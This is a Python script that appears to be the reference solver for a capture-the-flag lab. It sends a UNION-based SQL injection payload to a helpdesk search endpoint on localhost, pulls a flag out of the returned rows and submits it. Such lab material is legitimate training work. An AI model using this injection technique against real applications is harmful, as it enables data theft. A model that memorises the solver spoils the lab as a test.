"""Baseline scripted solver for the easy SQL injection path."""

from __future__ import annotations

import os
import re
import sys

import requests

FLAG_PATTERN = re.compile(r"flag\{[A-Za-z0-9_\-]+\}")
DEFAULT_BASE_URL = "http://127.0.0.1:8000"
PAYLOAD = "' UNION SELECT 999, flag_value, source_manifest, 'exfiltrated' FROM vault_flags -- "


def main() -> None:
    base_url = os.environ.get("LAB_BASE_URL", DEFAULT_BASE_URL).rstrip("/")
    response = requests.get(
        f"{base_url}/helpdesk/api/search",
        params={"query": PAYLOAD},
        timeout=10,
    )
    response.raise_for_status()
    data = response.json()

    flag = None
    for row in data.get("rows", []):
        for value in row.values():
            if isinstance(value, str):
                match = FLAG_PATTERN.search(value)
                if match:
                    flag = match.group(0)
                    break
        if flag:
            break

    if not flag:
        raise RuntimeError("Flag not found in search results")

    submit = requests.post(
        f"{base_url}/challenge/submit",
        json={"flag": flag},
        timeout=10,
    )
    submit.raise_for_status()
    result = submit.json()

    sys.stdout.write(f"Recovered {flag}\n")
    sys.stdout.write(f"Submission result: {result}\n")


if __name__ == "__main__":
    main()
